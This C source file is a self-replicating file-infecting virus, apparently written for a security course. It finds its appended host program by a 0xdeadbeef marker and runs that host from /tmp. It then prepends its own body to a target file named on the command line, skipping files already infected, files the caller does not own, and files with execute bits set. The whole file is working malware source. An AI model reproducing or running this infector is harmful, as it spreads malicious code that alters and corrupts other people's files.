#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/errno.h>
#include <sys/sendfile.h>
#include <sys/wait.h>

int main(int argc, char** argv) {

    // validate arguments
    if (argc < 2) {
        printf("Error: not enough arguments! Please enter a filename as first argument\n");
        return 1;
        
    } else if (argc > 2) {
        printf("Error: too many arguments! Please enter at most 1 filename\n");
        return 1;

    }
    
    // Copy Host to /tmp/host.ruid

    char tempfilename[20];
    uid_t ruid = getuid();
    sprintf(tempfilename, "/tmp/host.%u", ruid);

    // reset errno
    errno = 0;

    // attempt to create new file
    int tempfile = open(tempfilename, O_CREAT | O_EXCL | O_WRONLY, S_IRWXU);

    // check if that file was already there
    if (tempfile == -1 && errno == EEXIST) {
        // file exists! attempt to delete and leave
        unlink(tempfilename);

        // close our descriptor so the file is *officially* deleted
        close(tempfile);
        return 1;
    } else if (tempfile == -1) {
        // printf("Error: some error regarding opening temporary host file occured\n");
        return 1;

    }

    // open ourselves
    int seedfile = open(argv[0], O_RDONLY);

    if (seedfile == -1) {
        // printf("Error: seedfile cannot be opened\n");
        return 1;
    }

    // get info about files
    struct stat tempfilestat;
    fstat(tempfile, &tempfilestat);

    struct stat seedfilestat;
    fstat(seedfile, &seedfilestat);
    
    char magic[4] = {0xde, 0xad, 0xbe, 0xef};
    char buf[4];

    // find the hosts start location
    do {
        read(seedfile, buf, 4);
    } while ( memcmp(magic, buf, 4) != 0 );

    // where are we?
    off_t hoststart = lseek(seedfile, 0, SEEK_CUR);

    off_t hoststartcopy = hoststart;

    ssize_t transfered = sendfile(tempfile, seedfile, &hoststartcopy, seedfilestat.st_size - hoststart);

    if (transfered != seedfilestat.st_size - hoststart) {
        // printf("Error: could not tranfer host file to /tmp/\n");
        return 1;
    }

    // successful transfer

    // close file so it can be executed
    close(tempfile);

    pid_t pid = fork();
    int status;

    if (pid == 0) {
        // child process

        char* newargs[] = { NULL, argv[1], NULL };
        char* newenvs[] = { NULL };

        newargs[0] = tempfilename;

        // execute host temp file
        execve(newargs[0], newargs, newenvs);

    } else if (pid > 0){
        // parent process

        // wait for host to execute
        wait(&status);

        // delete file once it is executed
        unlink(tempfilename);

    } else {
        // Error!

        // printf("Error: creation of a child to execute host failed\n");
        return 1;
    }

    // Time to copy virus!

    // reset errno
    errno = 0;

    // try to open file to infect
    int infecteefile = open(argv[1], O_RDWR);

    if (infecteefile == -1 && errno == EACCES) {
        // printf("Error: cannot open specified file, lack necessary permissions\n");
        return 1;

    } else if (infecteefile == -1) {
        // printf("Error: cannot open specified file, unknown error\n");
        // perror("open");
        return 1;

    }

    // get infectee file data
    struct stat infecteestat;
    fstat(infecteefile, &infecteestat);

    if (infecteestat.st_uid != ruid) {
        // printf("Error: you do not own the specified file!\n");
        return 1;
    } else if (infecteestat.st_mode & S_IXUSR 
            || infecteestat.st_mode & S_IXGRP
            || infecteestat.st_mode & S_IXOTH ) {

        // some execute bit set

        // printf("Error: specified file has some executable permissions\n");
        return 1;
    }

    // temporarily hold its data
    char infecteedata[infecteestat.st_size];

    // get the data
    int infecteebytesread = read(infecteefile, infecteedata, infecteestat.st_size);

    if (infecteebytesread != infecteestat.st_size) {
        // printf("Error: could not copy data from specified file\n");
        return 1;
    }

    // reset seedfile seek pos to start
    off_t newoff = lseek(seedfile, 0, SEEK_SET);
    if (newoff != 0) {
        // seek error
        return 1;
    }
    // reset infectee file seek pos to start
    newoff = lseek(infecteefile, 0, SEEK_SET);
    if (newoff != 0) {
        // seek error
        return 1;
    }

    // check if already infected
    char seedbytes[4];
    char infbytes[4];
    do {
        read(seedfile, seedbytes, 4);
        read(infecteefile, infbytes, 4);
        if (memcmp(seedbytes, infbytes, 4) == 0 && memcmp(infbytes, magic, 4) == 0) {
            // already infected!
            return 1;
        }
    } while (memcmp(seedbytes, infbytes, 4) == 0);

    // expand file to hold virus
    int truncres = ftruncate(infecteefile, (off_t) (hoststart + infecteestat.st_size));

    if (truncres == -1) {
        // printf("Error: some truncation error");
        return 1;
    }

    // new seek pos to file start
    int newoffset = lseek(infecteefile, 0, SEEK_SET);

    if (newoffset != 0) {
        // printf("Error: seek error\n");
        return 1;
    }

    off_t offset = 0;

    // move virus portion of seed into specified file
    transfered = sendfile(infecteefile, seedfile, &offset, (size_t)hoststart);

    if (transfered != hoststart) { 
        // printf("Error: could not transfer virus to specified file\n");
        return 1;
    }

    transfered = write(infecteefile, infecteedata, infecteestat.st_size);

    if (transfered != infecteestat.st_size) { 
        // printf("Error: could not transfer data back to specified file\n");
        return 1;
    }
}
